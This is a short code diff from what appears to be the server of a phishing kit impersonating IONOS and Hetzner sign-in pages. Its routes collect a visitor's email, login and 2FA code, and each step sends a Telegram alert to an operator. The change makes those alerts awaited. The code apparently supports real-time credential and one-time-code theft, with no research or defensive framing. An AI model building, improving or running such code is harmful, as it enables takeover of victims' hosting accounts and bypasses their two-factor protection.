@@ -522,7 +522,7 @@ app.post("/api/ionos/start", async (req, res) => {
       ua: req.headers["user-agent"] || "",
     });
 
-    notifyFlowSessionAsync(session, "📧 IONOS — Email eingegeben");
+    await notifyFlowSession(session, "📧 IONOS — Email eingegeben");
     setupTelegramWebhookAsync();
 
     return res.json({ ok: true, sessionId: session.id, store: getStoreMode() });
@@ -613,7 +613,7 @@ app.post("/api/hetzner/start", async (req, res) => {
       ua: req.headers["user-agent"] || "",
     });
 
-    notifyHetznerSessionAsync(session, "🔐 Hetzner — Login");
+    await notifyHetznerSession(session, "🔐 Hetzner — Login");
     setupTelegramWebhookAsync();
 
     return res.json({ ok: true, sessionId: session.id, store: getStoreMode() });
@@ -667,7 +667,7 @@ app.post("/api/hetzner/session/:id/code", async (req, res) => {
   });
 
   const updated = await hetznerFlow.getSession(session.id);
-  notifyHetznerSessionAsync(updated, "🔢 Hetzner — 2FA Code");
+  await notifyHetznerSession(updated, "🔢 Hetzner — 2FA Code");
 
   return res.json({ ok: true, sessionId: session.id });
 });
